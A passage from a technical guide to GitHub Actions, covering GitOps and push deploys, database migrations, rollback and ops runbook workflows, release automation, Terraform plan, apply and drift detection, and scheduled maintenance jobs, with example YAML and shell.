          owner: ${{ github.repository_owner }}
          repositories: platform-config

      - uses: actions/checkout@v7
        with:
          repository: my-org/platform-config
          token: ${{ steps.app-token.outputs.token }}
          path: config

      - name: Update the staging image digest
        working-directory: config
        run: |
          yq -i '.spec.template.spec.containers[0].image = strenv(IMG)' \
            "envs/staging/api/deployment.yaml"
        env:
          IMG: ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}

      - name: Commit
        working-directory: config
        run: |
          git config user.name  'deploy-bot[bot]'
          git config user.email 'deploy-bot@users.noreply.github.com'
          git commit -am "chore(staging): api → ${GITHUB_SHA:0:7}"
          git push
```

For production, open a PR instead of pushing, so a human reviews the digest change. That PR *is* your deployment approval, and your Git history *is* your deployment audit log.

**GitOps vs push-based deploys:**

| | Push (workflow runs kubectl) | GitOps (Argo/Flux reconciles) |
|---|---|---|
| Cluster credentials in CI | Yes (OIDC) | **No** — huge security win |
| Drift correction | No | Yes, continuous |
| Audit trail | Run history | Git history of the config repo |
| Rollback | Re-run with old digest | `git revert` |
| Complexity | Lower | Higher (extra system) |
| Multi-cluster | Awkward | Natural |

### 33.7 Database migrations

The hardest part of deployment automation.

```yaml
  migrate:
    needs: [build]
    runs-on: ubuntu-24.04
    environment: production-db
    concurrency:
      group: db-migration-production        # global singleton
      cancel-in-progress: false
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: ${{ vars.DB_MIGRATION_ROLE }}, aws-region: ap-south-1 }

      - name: Show pending migrations
        run: |
          flyway -url="$DB_URL" -user="$DB_USER" -password="$DB_PASS" info
        env: { DB_URL: ${{ secrets.DB_URL }}, DB_USER: ${{ secrets.DB_USER }}, DB_PASS: ${{ secrets.DB_PASS }} }

      - name: Apply
        run: |
          flyway -url="$DB_URL" -user="$DB_USER" -password="$DB_PASS" \
                 -baselineOnMigrate=true -outOfOrder=false migrate
        env: { DB_URL: ${{ secrets.DB_URL }}, DB_USER: ${{ secrets.DB_USER }}, DB_PASS: ${{ secrets.DB_PASS }} }
```

⚠️ **Migrations must be backward compatible with the currently-running application version**, because during a rolling deploy both versions run simultaneously.

The expand/contract pattern:

```mermaid
flowchart LR
    A["Release 1: EXPAND<br/>Add new nullable column.<br/>App writes both old and new."] --> B["Release 2: MIGRATE<br/>Backfill data.<br/>App reads new, writes both."]
    B --> C["Release 3: CONTRACT<br/>App reads and writes new only.<br/>Drop the old column."]
```

Three deploys to rename a column. Tedious, and the only safe way.

⚠️ Never put a destructive migration (`DROP COLUMN`, `DROP TABLE`) in the same release as the code change that stops using it. You lose your rollback.

### 33.8 Rollback as a first-class workflow

```yaml
# .github/workflows/rollback.yml
name: 🔴 Rollback

on:
  workflow_dispatch:
    inputs:
      environment:
        type: environment
        required: true
      service:
        type: choice
        options: [api, worker, scheduler]
        required: true
      to_revision:
        description: 'Helm revision to roll back to, or blank for previous'
        type: string
        required: false
      reason:
        description: 'Why (goes into the audit trail)'
        type: string
        required: true

run-name: "🔴 ROLLBACK ${{ inputs.service }} in ${{ inputs.environment }} by @${{ github.actor }}"

permissions:
  contents: read
  id-token: write

jobs:
  rollback:
    runs-on: ubuntu-24.04
    environment: ${{ inputs.environment }}
    concurrency:
      group: deploy-${{ inputs.service }}-${{ inputs.environment }}
      cancel-in-progress: false
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}, aws-region: ${{ vars.AWS_REGION }} }
      - run: aws eks update-kubeconfig --name "${{ vars.CLUSTER_NAME }}"

      - name: Show history
        run: helm history "${{ inputs.service }}" -n "${{ vars.NAMESPACE }}"

      - name: Roll back
        run: |
          helm rollback "${{ inputs.service }}" ${{ inputs.to_revision }} \
            -n "${{ vars.NAMESPACE }}" --wait --timeout 5m

      - name: Verify
        run: kubectl -n "${{ vars.NAMESPACE }}" rollout status "deploy/${{ inputs.service }}" --timeout=5m

      - name: Notify
        if: always()
        uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_INCIDENT_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "🔴 Rollback of *${{ inputs.service }}* in *${{ inputs.environment }}* — ${{ job.status }}\nReason: ${{ inputs.reason }}\nBy: @${{ github.actor }}"
```

🧠 **Test your rollback workflow on a schedule.** A rollback path that has never been exercised is not a rollback path. Run it monthly against staging.

### 33.9 Serverless deployments

```yaml
      # AWS Lambda
      - run: |
          aws lambda update-function-code \
            --function-name my-fn \
            --image-uri "${{ inputs.image }}" \
            --publish
          aws lambda wait function-updated --function-name my-fn
          aws lambda update-alias --function-name my-fn --name live \
            --function-version "$VERSION" \
            --routing-config "AdditionalVersionWeights={$PREV=0.9}"   # 10% canary

      # Google Cloud Run
      - run: |
          gcloud run deploy api --image "${{ inputs.image }}" \
            --region asia-south1 --no-traffic --tag candidate
          gcloud run services update-traffic api --to-tags candidate=10
```

---

## Chapter 34 — Category G: Release Engineering

**Purpose:** decide what version this is, write down what changed, tag it, and publish it — consistently and without human error.

### 34.1 Tag-triggered release

```yaml
# .github/workflows/release.yml
name: Release
on:
  push:
    tags: ['v*.*.*']

permissions:
  contents: write
  packages: write
  id-token: write
  attestations: write

jobs:
  release:
    runs-on: ubuntu-24.04
    environment: release
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }

      - uses: actions/setup-go@v7
        with: { go-version: '1.24', cache: true }

      - name: Build release binaries
        run: |
          set -euo pipefail
          VERSION="${GITHUB_REF_NAME}"
          mkdir -p dist
          for target in linux/amd64 linux/arm64 darwin/arm64 windows/amd64; do
            GOOS="${target%/*}" GOARCH="${target#*/}" \
            CGO_ENABLED=0 go build -trimpath \
              -ldflags "-s -w -X main.version=${VERSION} -X main.commit=${GITHUB_SHA}" \
              -o "dist/api-${GOOS}-${GOARCH}${GOOS:+$([ "$GOOS" = windows ] && echo .exe)}" ./cmd/api
          done
          cd dist && sha256sum * > checksums.txt

      - uses: actions/attest-build-provenance@v4
        with: { subject-path: 'dist/*' }

      - name: Generate changelog
        id: changelog
        run: |
          set -euo pipefail
          PREV="$(git describe --tags --abbrev=0 "${GITHUB_REF_NAME}^" 2>/dev/null || echo '')"
          RANGE="${PREV:+$PREV..}${GITHUB_REF_NAME}"
          D="$(openssl rand -hex 12)"
          {
            echo "notes<<$D"
            echo "## What's changed"
            echo ""
            git log --pretty='- %s (%h) by @%an' "$RANGE" | grep -v '^- chore(deps)' || true
            echo ""
            [ -n "$PREV" ] && echo "**Full changelog**: ${{ github.server_url }}/${{ github.repository }}/compare/${PREV}...${GITHUB_REF_NAME}"
            echo "$D"
          } >> "$GITHUB_OUTPUT"

      - uses: softprops/action-gh-release@v3
        with:
          files: dist/*
          body: ${{ steps.changelog.outputs.notes }}
          generate_release_notes: true
          draft: false
          prerelease: ${{ contains(github.ref_name, '-rc') || contains(github.ref_name, '-beta') }}
```

### 34.2 Automated semantic versioning

Two mainstream approaches.

**release-please** (Google) — maintains a permanently-open "Release PR" that accumulates changes and bumps the version. Merging it creates the tag and release.

```yaml
# .github/workflows/release-please.yml
name: release-please
on:
  push: { branches: [main] }

permissions:
  contents: write
  pull-requests: write

jobs:
  rp:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/create-github-app-token@v2
        id: app-token
        with:
          app-id: ${{ vars.BOT_APP_ID }}
          private-key: ${{ secrets.BOT_APP_PRIVATE_KEY }}
      - uses: googleapis/release-please-action@v4
        with:
          token: ${{ steps.app-token.outputs.token }}
          config-file: release-please-config.json
          manifest-file: .release-please-manifest.json
```

Monorepo config:

```json
{
  "packages": {
    "services/api":    { "release-type": "maven",  "package-name": "api" },
    "services/worker": { "release-type": "maven",  "package-name": "worker" },
    "libs/common":     { "release-type": "maven",  "package-name": "common" }
  },
  "separate-pull-requests": true,
  "changelog-sections": [
    { "type": "feat", "section": "Features" },
    { "type": "fix",  "section": "Bug fixes" },
    { "type": "perf", "section": "Performance" }
  ]
}
```

**semantic-release** (Node ecosystem, works for anything) — analyses commits and releases immediately on every qualifying merge, no release PR.

Both require **Conventional Commits** (`feat:`, `fix:`, `feat!:` for breaking). Enforce with the PR title linter from §28.3 plus squash-merge, so the PR title becomes the commit message.

```mermaid
flowchart LR
    A["PR titled<br/>feat: add bulk import"] --> B["Squash merge to main"]
    B --> C["release-please reads commits"]
    C --> D{"Highest change type?"}
    D -->|"feat!  or BREAKING CHANGE"| E["major: 1.4.2 → 2.0.0"]
    D -->|"feat"| F["minor: 1.4.2 → 1.5.0"]
    D -->|"fix / perf"| G["patch: 1.4.2 → 1.4.3"]
    E --> H["Update/open Release PR<br/>with CHANGELOG"]
    F --> H
    G --> H
    H --> I["Human merges Release PR"]
    I --> J["Tag v1.5.0 + GitHub Release"]
    J --> K["release.yml publishes artifacts"]
```

🧠 The release PR is a nice control point: a human sees the computed version and the generated changelog before anything is published.

### 34.3 Release checklist workflow

```yaml
  pre-release-checks:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - name: Verify release readiness
        run: |
          set -euo pipefail
          FAIL=0
          check() { if eval "$2"; then echo "✅ $1"; else echo "❌ $1"; FAIL=1; fi; }

          check "CHANGELOG updated"        "git diff --name-only HEAD~1 | grep -q CHANGELOG"
          check "No TODO markers in src"   "! grep -rn 'TODO(FIXME-BEFORE-RELEASE)' src/"
          check "No SNAPSHOT dependencies" "! grep -rn 'SNAPSHOT' pom.xml"
          check "Version is not -dirty"    "[ -z \"\$(git status --porcelain)\" ]"
          check "All migrations reversible" "./scripts/check-migrations.sh"

          exit $FAIL
```

---

## Chapter 35 — Category H: Infrastructure as Code

**Purpose:** apply the same review-and-verify discipline to infrastructure that you apply to application code.

### 35.1 Plan on PR, apply on merge

```yaml
# .github/workflows/terraform.yml
name: Terraform

on:
  pull_request:
    paths: ['infra/**', '.github/workflows/terraform.yml']
  push:
    branches: [main]
    paths: ['infra/**']

permissions:
  contents: read

jobs:
  plan:
    if: github.event_name == 'pull_request'
    strategy:
      fail-fast: false
      matrix:
        workspace: [dev, staging, production]
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      pull-requests: write
      id-token: write
    steps:
      - uses: actions/checkout@v7

      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.TF_PLAN_ROLE_ARN }}      # READ-ONLY role
          aws-region: ap-south-1

      - uses: hashicorp/setup-terraform@v4
        with:
          terraform_version: 1.9.8
          terraform_wrapper: false

      - run: terraform fmt -check -recursive
        working-directory: infra

      - run: terraform init -backend-config="key=${{ matrix.workspace }}/terraform.tfstate"
        working-directory: infra

      - run: terraform validate
        working-directory: infra

      - uses: bridgecrewio/checkov-action@master
        with: { directory: infra/, framework: terraform, soft_fail: false }

      - id: plan
        working-directory: infra
        run: |
          set -o pipefail
          terraform plan -no-color -input=false -lock-timeout=5m \
            -var-file="envs/${{ matrix.workspace }}.tfvars" \
            -out=tfplan | tee plan.txt
          echo "exitcode=$?" >> "$GITHUB_OUTPUT"

      - name: Summarise plan
        working-directory: infra
        run: |
          terraform show -json tfplan > plan.json
          {
            echo "### Terraform plan — \`${{ matrix.workspace }}\`"
            echo ""
            jq -r '
              [.resource_changes[]? | select(.change.actions != ["no-op"])]
              | group_by(.change.actions[0])
              | map("- **\(.[0].change.actions[0])**: \(length) resources")
              | join("\n")' plan.json
            echo ""
            echo "<details><summary>Full plan</summary>"
            echo ""
            echo '```terraform'
            tail -c 60000 plan.txt
            echo '```'
            echo ""
            echo "</details>"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Comment plan on the PR
        uses: actions/github-script@v9
        env:
          WORKSPACE: ${{ matrix.workspace }}
        with:
          script: |
            const fs = require('fs');
            const ws = process.env.WORKSPACE;
            const marker = `<!-- tfplan-${ws} -->`;
            let plan = fs.readFileSync('infra/plan.txt', 'utf8');
            if (plan.length > 60000) plan = '...truncated...\n' + plan.slice(-60000);
            const body = `${marker}\n### Terraform plan \`${ws}\`\n\n<details><summary>Show</summary>\n\n\`\`\`terraform\n${plan}\n\`\`\`\n\n</details>`;
            const { data: comments } = await github.rest.issues.listComments({
              ...context.repo, issue_number: context.issue.number });
            const prev = comments.find(c => c.body?.includes(marker));
            if (prev) await github.rest.issues.updateComment({ ...context.repo, comment_id: prev.id, body });
            else await github.rest.issues.createComment({ ...context.repo, issue_number: context.issue.number, body });

      - uses: actions/upload-artifact@v7
        with:
          name: tfplan-${{ matrix.workspace }}
          path: infra/tfplan
          retention-days: 5

  apply:
    if: github.event_name == 'push'
    strategy:
      max-parallel: 1
      matrix:
        workspace: [dev, staging, production]
    runs-on: ubuntu-24.04
    environment: tf-${{ matrix.workspace }}
    concurrency:
      group: terraform-${{ matrix.workspace }}
      cancel-in-progress: false
    permissions: { contents: read, id-token: write }
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.TF_APPLY_ROLE_ARN }}     # WRITE role, env-scoped
          aws-region: ap-south-1
      - uses: hashicorp/setup-terraform@v4
        with: { terraform_version: 1.9.8, terraform_wrapper: false }
      - working-directory: infra
        run: |
          terraform init -backend-config="key=${{ matrix.workspace }}/terraform.tfstate"
          terraform apply -auto-approve -input=false -lock-timeout=10m \
            -var-file="envs/${{ matrix.workspace }}.tfvars"
```

Design notes:
- **Separate IAM roles for plan and apply.** Plan is read-only; apply is write-only and bound to an environment.
- **`terraform_wrapper: false`** — the wrapper's output capture interferes with `tee` and exit codes.
- **`max-parallel: 1`** on apply so environments progress in order, and a dev failure stops production.
- **Concurrency per workspace** so two runs never fight over the state lock.
- ⚠️ **Do not apply the saved plan file from the PR** unless you also re-verify it. A plan generated against a state that has since changed is stale. Most teams re-plan inside apply; `-auto-approve` on a fresh plan plus the environment approval gate is the pragmatic middle ground.

### 35.2 Drift detection

```yaml
# .github/workflows/tf-drift.yml
name: Terraform drift detection
on:
  schedule: [{ cron: '0 5 * * *' }]
  workflow_dispatch:

permissions:
  contents: read
  issues: write
  id-token: write

jobs:
  drift:
    strategy:
      fail-fast: false
      matrix:
        workspace: [staging, production]
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with: { role-to-assume: ${{ vars.TF_PLAN_ROLE_ARN }}, aws-region: ap-south-1 }
      - uses: hashicorp/setup-terraform@v4
        with: { terraform_version: 1.9.8, terraform_wrapper: false }

      - id: drift
        working-directory: infra
        continue-on-error: true
        run: |
          terraform init -backend-config="key=${{ matrix.workspace }}/terraform.tfstate"
          terraform plan -detailed-exitcode -no-color -input=false \
            -var-file="envs/${{ matrix.workspace }}.tfvars" > drift.txt 2>&1
          echo "code=$?" >> "$GITHUB_OUTPUT"

      - name: Raise an issue if drifted
        if: steps.drift.outputs.code == '2'
        uses: actions/github-script@v9
        with:
          script: |
            const fs = require('fs');
            const ws = '${{ matrix.workspace }}';
            const title = `Infrastructure drift detected in ${ws}`;
            const { data: open } = await github.rest.issues.listForRepo({
              ...context.repo, state: 'open', labels: 'drift' });
            const existing = open.find(i => i.title === title);
            const body = `Drift detected on ${new Date().toISOString()}\n\n\`\`\`\n${fs.readFileSync('infra/drift.txt','utf8').slice(0,50000)}\n\`\`\``;
            if (existing) await github.rest.issues.createComment({ ...context.repo, issue_number: existing.number, body });
            else await github.rest.issues.create({ ...context.repo, title, body, labels: ['drift','infrastructure'] });
```

`-detailed-exitcode` returns 0 (no changes), 1 (error), 2 (changes present). Exit code 2 means someone changed infrastructure outside Terraform.

### 35.3 Kubernetes manifest policy

```yaml
  policy:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - name: Render manifests
        run: |
          mkdir -p rendered
          for chart in charts/*/; do
            helm template "$(basename "$chart")" "$chart" \
              -f "$chart/values-production.yaml" > "rendered/$(basename "$chart").yaml"
          done

      - name: Conftest policy check
        run: |
          curl -sSL https://github.com/open-policy-agent/conftest/releases/latest/download/conftest_Linux_x86_64.tar.gz | tar xz
          ./conftest test rendered/ --policy policies/ --all-namespaces

      - name: Kubeconform schema validation
        run: |
          curl -sSL https://github.com/yannh/kubeconform/releases/latest/download/kubeconform-linux-amd64.tar.gz | tar xz
          ./kubeconform -strict -summary -kubernetes-version 1.31.0 rendered/
```

Example policy (Rego) — every production workload must set resource limits:

```rego
package main

deny[msg] {
  input.kind == "Deployment"
  c := input.spec.template.spec.containers[_]
  not c.resources.limits.memory
  msg := sprintf("Container %v has no memory limit", [c.name])
}

deny[msg] {
  input.kind == "Deployment"
  not input.spec.template.spec.securityContext.runAsNonRoot
  msg := sprintf("Deployment %v must set runAsNonRoot", [input.metadata.name])
}
```

---

## Chapter 36 — Category I: Scheduled and Maintenance Workflows

**Purpose:** do the work that nobody remembers to do.

### 36.1 The maintenance portfolio

| Workflow | Cadence | Value |
|---|---|---|
| Nightly full test matrix | daily | Catches the combinations the PR gate skips |
| Dependency freshness report | weekly | Visibility on how far behind you are |
| Cache and artifact cleanup | weekly | 💰 Stops silent cache eviction and storage bills |
| Registry image pruning | weekly | 💰 Storage cost |
| Certificate / token expiry check | daily | Prevents the 3 a.m. outage |
| Infrastructure drift detection | daily | §35.2 |
| Stale branch / issue cleanup | weekly | Repo hygiene |
| Runner version deprecation check | weekly | 📌 Uses the new deprecations API |
| Backup verification | daily | A backup you have never restored is a hope |
| Cost report | weekly | 💰 §49.6 |
| Link checking in docs | weekly | |
| Licence compliance audit | monthly | |

### 36.2 Nightly full matrix

```yaml
# .github/workflows/nightly.yml
name: Nightly
on:
  schedule: [{ cron: '0 2 * * *', timezone: 'Asia/Kolkata' }]
  workflow_dispatch:

permissions:
  contents: read
  issues: write

jobs:
  full-matrix:
    strategy:
      fail-fast: false
      matrix:
        java: ['21', '25']
        os: [ubuntu-24.04, ubuntu-24.04-arm, windows-latest]
        profile: [default, jdk-preview]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '${{ matrix.java }}', cache: maven }
      - run: mvn -B -ntp verify -P${{ matrix.profile }}

  report-failures:
    needs: full-matrix
    if: failure()
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/github-script@v9
        with:
          script: |
            const title = `Nightly build failed — ${new Date().toISOString().slice(0,10)}`;
            await github.rest.issues.create({
              ...context.repo, title,
              labels: ['nightly-failure', 'automated'],
              body: `[Run](${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId})`
            });
```

### 36.3 Certificate and credential expiry monitoring

```yaml
# .github/workflows/expiry-check.yml
name: Expiry checks
on:
  schedule: [{ cron: '0 8 * * *' }]
  workflow_dispatch:

permissions: { issues: write, contents: read }

jobs:
  tls:
    runs-on: ubuntu-24.04
    steps:
      - name: Check TLS certificates
        run: |
          set -euo pipefail
          WARN_DAYS=21
          FAILED=0
          for host in api.example.com app.example.com internal.example.com; do
            END="$(echo | openssl s_client -servername "$host" -connect "$host:443" 2>/dev/null \
                   | openssl x509 -noout -enddate | cut -d= -f2)"
            DAYS=$(( ( $(date -d "$END" +%s) - $(date +%s) ) / 86400 ))
            echo "$host expires in $DAYS days ($END)"
            if [ "$DAYS" -lt "$WARN_DAYS" ]; then
              echo "::error::TLS certificate for $host expires in $DAYS days"
              FAILED=1
            fi
          done
          exit $FAILED
```

Do the same for: GPG signing keys, GitHub App private keys, PATs still in use, cloud access keys you have not yet migrated to OIDC, and 📌 self-hosted runner versions via the deprecations API:

```yaml
      - name: Check runner version deprecation
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          VER="2.330.0"
          gh api "/repos/${GITHUB_REPOSITORY}/actions/runners/deprecations/${VER}" \
            | jq -r '"runner \(.runner_version): runtime ends \(.runtime_deprecates_at), registration ends \(.registration_deprecates_at)"'
```

### 36.4 Stale issue and branch cleanup

```yaml
  stale:
    runs-on: ubuntu-24.04
    permissions: { issues: write, pull-requests: write }
    steps:
      - uses: actions/stale@v9
        with:
          days-before-issue-stale: 60
          days-before-issue-close: 14
          days-before-pr-stale: 21
          days-before-pr-close: 7
          exempt-issue-labels: 'pinned,security,roadmap'
          exempt-draft-pr: true
          stale-issue-message: 'No activity for 60 days. Closing in 14 days unless updated.'
```

### 36.5 Cache and artifact cleanup

```yaml
  cache-cleanup:
    runs-on: ubuntu-24.04
    permissions: { actions: write }
    steps:
      - name: Delete caches for closed branches
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          set -euo pipefail
          # branches that no longer exist
          gh cache list --limit 200 --json id,key,ref,sizeInBytes \
            | jq -r '.[] | select(.ref | startswith("refs/pull/")) | "\(.id) \(.key)"' \
            | while read -r id key; do
                echo "Deleting stale PR cache: $key"
                gh cache delete "$id" || true
              done

      - name: Report total cache usage
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          gh api "/repos/${GITHUB_REPOSITORY}/actions/cache/usage" \
            | jq -r '"Active caches: \(.active_caches_count), total \(.active_caches_size_in_bytes/1024/1024/1024 | floor) GB of 10 GB"' \
            >> "$GITHUB_STEP_SUMMARY"
```

### 36.6 Scheduled workflow discipline

- Add `workflow_dispatch` to **every** scheduled workflow so you can run it on demand and test it.
- Stagger cron times. If twelve repos all fire at `0 0 * * *`, they queue behind each other.
- Avoid the top of the hour; `:17` past is less contended than `:00`.
- Make them idempotent — they will occasionally run twice.
- Alert on *absence*: a scheduled workflow that silently stops running is worse than one that fails loudly. Monitor last-run time externally, or with a dead-man's-switch ping.

---

## Chapter 37 — Category J: Manual Operational Runbooks

**Purpose:** turn tribal knowledge and copy-pasted commands into audited, permissioned, repeatable buttons.

🧠 This is, in my view, the most under-used capability in GitHub Actions. Every `kubectl` command an engineer runs by hand against production is an unaudited, unreviewed, unrepeatable operation. Turning it into a `workflow_dispatch` gives you: an audit log, an approval gate, input validation, a consistent environment, and a record of who did what and why.

### 37.1 The runbook template

```yaml
# .github/workflows/ops-runbook.yml
name: 🛠 Ops Runbook

on:
  workflow_dispatch:
    inputs:
      action:
        description: 'Operation to perform'
        type: choice
        required: true
        options:
          - restart-service
          - scale-service
          - clear-cache
          - reindex-search
          - replay-dlq
          - rotate-credential
      environment:
        type: environment
        required: true
      service:
        type: choice
        options: [api, worker, scheduler]
        required: true
      parameter:
        description: 'Extra parameter (replica count, queue name, ...)'
        type: string
        required: false
      reason:
        description: 'Why are you doing this? (required for the audit trail)'
        type: string
        required: true
      confirm:
        description: 'Type the environment name to confirm'
        type: string
        required: true

run-name: "🛠 ${{ inputs.action }} · ${{ inputs.service }} · ${{ inputs.environment }} · @${{ github.actor }}"

permissions:
  contents: read
  id-token: write

jobs:
  guard:
    runs-on: ubuntu-24.04
    steps:
      - name: Confirmation must match the environment
        run: |
          if [ "${{ inputs.confirm }}" != "${{ inputs.environment }}" ]; then
            echo "::error::Confirmation '${{ inputs.confirm }}' does not match environment '${{ inputs.environment }}'"
            exit 1
          fi

  run:
    needs: guard
    runs-on: ubuntu-24.04
    environment: ${{ inputs.environment }}
    concurrency:
      group: ops-${{ inputs.environment }}-${{ inputs.service }}
      cancel-in-progress: false
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.OPS_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
          role-session-name: ops-${{ github.actor }}-${{ github.run_id }}
      - run: aws eks update-kubeconfig --name "${{ vars.CLUSTER_NAME }}"

      - name: Execute
        env:
          NS: ${{ vars.NAMESPACE }}
          SVC: ${{ inputs.service }}
          PARAM: ${{ inputs.parameter }}
        run: |
          set -euo pipefail
          case "${{ inputs.action }}" in
            restart-service)
              kubectl -n "$NS" rollout restart "deployment/$SVC"
              kubectl -n "$NS" rollout status "deployment/$SVC" --timeout=5m
              ;;
            scale-service)
              [ -n "$PARAM" ] || { echo "::error::parameter (replica count) is required"; exit 1; }
              kubectl -n "$NS" scale "deployment/$SVC" --replicas="$PARAM"
              kubectl -n "$NS" rollout status "deployment/$SVC" --timeout=5m
              ;;
            clear-cache)
              kubectl -n "$NS" exec deploy/redis -- redis-cli FLUSHDB
              ;;
            reindex-search)
              kubectl -n "$NS" create job "reindex-${GITHUB_RUN_ID}" --from=cronjob/reindex
              kubectl -n "$NS" wait --for=condition=complete "job/reindex-${GITHUB_RUN_ID}" --timeout=30m
              ;;
            replay-dlq)
              [ -n "$PARAM" ] || { echo "::error::parameter (queue name) is required"; exit 1; }
              ./scripts/replay-dlq.sh "$PARAM"
              ;;
            rotate-credential)
              ./scripts/rotate.sh "$PARAM"
              ;;
            *)
              echo "::error::Unknown action"; exit 1 ;;
          esac

      - name: Record in the audit trail
        if: always()
        run: |
          {
            echo "## Ops action: ${{ inputs.action }}"
            echo ""
            echo "| Field | Value |"
            echo "|---|---|"
            echo "| Environment | ${{ inputs.environment }} |"
            echo "| Service | ${{ inputs.service }} |"
            echo "| Parameter | ${{ inputs.parameter || '—' }} |"
            echo "| Reason | ${{ inputs.reason }} |"
            echo "| Operator | @${{ github.triggering_actor }} |"
            echo "| Result | ${{ job.status }} |"
            echo "| Time | $(date -u +%FT%TZ) |"
          } >> "$GITHUB_STEP_SUMMARY"

      - name: Announce in Slack
        if: always()
        uses: slackapi/slack-github-action@v4
        with:
          webhook: ${{ secrets.SLACK_OPS_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            text: "🛠 `${{ inputs.action }}` on *${{ inputs.service }}* in *${{ inputs.environment }}* by @${{ github.actor }} — ${{ job.status }}\n> ${{ inputs.reason }}"
```

Key safety features:
- A **separate guard job** that validates the typed confirmation before any credentials are assumed.
- **`environment:`** so production runbooks require approval.
- **`reason`** is mandatory and lands in the audit trail and the Slack message.
- **`role-session-name`** includes the actor, so the cloud provider's own audit log shows who did it.
- **Concurrency** so two people cannot run conflicting operations simultaneously.

### 37.2 Other runbooks worth building

| Runbook | Inputs | Notes |
|---|---|---|
| Deploy a specific version | service, version, environment | The "promote this exact digest" button |
| Rollback | service, environment, revision, reason | §33.8 |
| Feature flag toggle | flag, value, percentage, environment | Audited flag changes |
| Data backfill | job name, date range, dry-run | Always default `dry_run: true` |
| Seed a test environment | environment, dataset | Makes ephemeral envs cheap |
| Emergency scale-up | service, replicas, TTL | Include a follow-up scale-down |
| Rotate a secret | secret name, target | |
| Generate a compliance report | period | |
| Force cache invalidation | CDN path | |
| Create an ephemeral PR environment | PR number | §33 + §38 |

### 37.3 Making dangerous operations obviously dangerous

```yaml
on:
  workflow_dispatch:
    inputs:
      dry_run:
        description: 'Plan only. UNCHECK to actually make changes.'
        type: boolean
        default: true              # ← always default to safe
```

```yaml
      - name: Execute
        run: |
          if [ "${{ inputs.dry_run }}" = "true" ]; then
            echo "DRY RUN — would execute:"
            ./scripts/backfill.sh --dry-run
          else
            echo "::warning::EXECUTING FOR REAL"
            ./scripts/backfill.sh
          fi
```

⚠️ Remember: `inputs.dry_run` respects the boolean type. `github.event.inputs.dry_run` is the string `"false"`, which is truthy — a bug that will execute a destructive operation you thought you had disabled.

---

## Chapter 38 — Category K: Repo Automation and ChatOps

**Purpose:** remove human toil from the repository itself.

### 38.1 Auto-labelling by changed path

```yaml
# .github/labeler.yml
backend:
  - changed-files:
      - any-glob-to-any-file: ['services/**', 'libs/**', 'pom.xml']
infrastructure:
  - changed-files:
      - any-glob-to-any-file: ['infra/**', 'charts/**', '**/Dockerfile']
ci:
  - changed-files:
      - any-glob-to-any-file: ['.github/**']
documentation:
  - changed-files:
      - any-glob-to-any-file: ['docs/**', '**/*.md']
database:
  - changed-files:
      - any-glob-to-any-file: ['**/db/migration/**']
```

```yaml
# .github/workflows/labeler.yml
name: Labeler
on: [pull_request_target]

permissions:
  contents: read
  pull-requests: write

jobs:
  label:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/labeler@v5
```

🧠 This is a **legitimate** use of `pull_request_target`: it needs write access to label a fork PR, and it never checks out or executes PR code.

### 38.2 Auto-assigning reviewers beyond CODEOWNERS

```yaml
  assign:
    if: github.event.pull_request.draft == false
    runs-on: ubuntu-24.04
    permissions: { pull-requests: write }
    steps:
      - uses: actions/github-script@v9
        with:
          script: |
            const labels = context.payload.pull_request.labels.map(l => l.name);
            const teams = [];
            if (labels.includes('database')) teams.push('dba-team');
            if (labels.includes('infrastructure')) teams.push('platform-team');
            if (teams.length) {
              await github.rest.pulls.requestReviewers({
                ...context.repo,
                pull_number: context.issue.number,
                team_reviewers: teams,
              });
            }
```

### 38.3 Auto-generated PR checklists

```yaml
  checklist:
    if: github.event.action == 'opened'
    runs-on: ubuntu-24.04
    permissions: { pull-requests: write }
    steps:
      - uses: actions/github-script@v9
        with:
          script: |
            const files = await github.paginate(github.rest.pulls.listFiles, {
              ...context.repo, pull_number: context.issue.number });
            const items = [];
            if (files.some(f => f.filename.includes('db/migration')))
              items.push('- [ ] Migration is backward compatible with the currently deployed version');
            if (files.some(f => f.filename.endsWith('.tf')))
              items.push('- [ ] Terraform plan reviewed for all three workspaces');
            if (files.some(f => f.filename.includes('/api/')))
              items.push('- [ ] API change is backward compatible or versioned');
            if (items.length) {
              await github.rest.issues.createComment({
                ...context.repo, issue_number: context.issue.number,
                body: `### Reviewer checklist\n\nThis PR touches sensitive areas:\n\n${items.join('\n')}`
              });
            }
```

### 38.4 ChatOps: commands in PR comments

```yaml
# .github/workflows/chatops.yml
name: ChatOps
on:
  issue_comment:
    types: [created]

permissions:
  contents: read

jobs:
  dispatch:
    if: >-
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/')
    runs-on: ubuntu-24.04
    permissions:
      pull-requests: write
      contents: read
